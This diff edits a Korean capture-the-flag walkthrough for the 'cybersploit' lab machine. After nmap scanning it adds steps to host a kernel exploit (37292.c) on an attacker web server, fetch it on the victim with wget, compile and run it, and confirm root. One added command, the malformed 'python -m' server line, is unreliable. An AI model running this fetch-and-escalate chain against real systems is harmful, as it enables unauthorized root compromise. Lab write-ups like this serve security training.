@@ -1,4 +1,3 @@
-cybersploit ctf
 # \[1] 정보 수집
 `nmap 192.168.56.0/24`[[nmap_cybersploit]]
 `nmap 192.168.56.0/24 -sV -v -p-`[[nmap_cybersploit_d]]
@@ -88,3 +87,16 @@ Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/1 | linux/local/37293.txt
 - 그러기 위해서는 공격자 pc를 파일 공유를 위한 웹 서버로 만들어 victim에서 wget을 통해 다운로드 받도록 한다.
 
 ## \[2-1] 서버 구축
+- 데비안 계열 웹 서버 구축은 아파치로 진행한다. `apt install -y apache2 && systemctl start apache2`
+- 파이썬도 가능 `python -m 10.0.2.15 4444`
+- `/var/www/html/37292.c`로 파일 옮긴다.
+
+## \[2-2] 접속&다운로드
+victim의 shell에서 접속해 파일 다운
+`wget http://10.0.0.4:4444/37292.c && ls`
+
+## \[2-3] 컴파일 후 실행
+`gcc -o cyber 37292.c && ./cyber`
+
+## \[2-4] 점검
+`pwd` 또는 `who am i` 명령어로 root 권한을 취득했는지 확인
